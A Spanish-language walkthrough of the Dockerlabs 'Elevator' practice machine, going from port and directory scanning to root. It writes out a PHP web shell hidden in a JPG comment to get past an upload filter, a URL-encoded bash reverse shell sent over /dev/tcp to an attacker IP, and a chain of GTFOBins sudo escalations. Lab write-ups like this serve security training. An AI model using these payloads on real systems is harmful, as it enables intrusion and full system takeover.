---
description: >-
  ✍️ Autor: beafn28🔍 Dificultad: Fácil  📅 Fecha de creación: 1/12/2024
  🐳Dockerlabs
---

# Elevator

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../.gitbook/assets/image (972).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sobre un misterio en un ascensor.

<figure><img src="../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>

Entramos en ese directorio pero no encontramos nada. Por lo que hacemos otra búsqueda de directorios.

```bash
gobuster dir -u http://172.17.0.2/themes -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,html,php
```

<figure><img src="../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

Vemos un directorio `/uploads` y un `archivo.html` por lo que supongamos que podemos subir una Reverse Shell.

<figure><img src="../.gitbook/assets/image (977).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Como podemos ver solo nos deja subir archivos en formato **.jpg** por lo que creamos una imagen y le insertamos código malicioso.

```bash
convert -size 200x200 xc:red ~/Desktop/malicious_image.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' ~/Desktop/malicious_image.jpg
```

Subimos la imagen y nos vamos al directorio `/uploads`.

<figure><img src="../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha.

```bash
nc -nlvp 443
```

Mientras en el buscador.

```bash
http://172.17.0.2/themes/uploads/6748e39cbd8ea.jpg.php?cmd=bash%20-c%20%22bash%20-i%20>%26%20/dev/tcp/192.168.255.136/443%200>%261%22
```

<figure><img src="../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **env** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/env/)cómo explotarlo.

```bash
sudo -u daphne /usr/bin/env /bin/sh
```

<figure><img src="../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>

Ya somos **daphne**.

<figure><img src="../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **ash** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/ash/)cómo explotarlo.

```bash
sudo -u vilma /usr/bin/ash
```

<figure><img src="../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>

Ya somos **vilma**.

<figure><img src="../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **ruby** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/ruby/)cómo explotarlo.

```bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
```

<figure><img src="../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>

Ya somos **shaggy**.

<figure><img src="../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **lua** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/lua/)cómo explotarlo.

```bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
```

<figure><img src="../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>

Ya somos **fred**.

<figure><img src="../.gitbook/assets/image (990).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **gcc** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/gcc/)cómo explotarlo.

```bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
```

<figure><img src="../.gitbook/assets/image (991).png" alt=""><figcaption></figcaption></figure>

Ya somos **scooby**.

<figure><img src="../.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **sudo** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/sudo/)cómo explotarlo.

```bash
sudo -u root /usr/bin/sudo /bin/sh
```

<figure><img src="../.gitbook/assets/image (993).png" alt=""><figcaption></figcaption></figure>
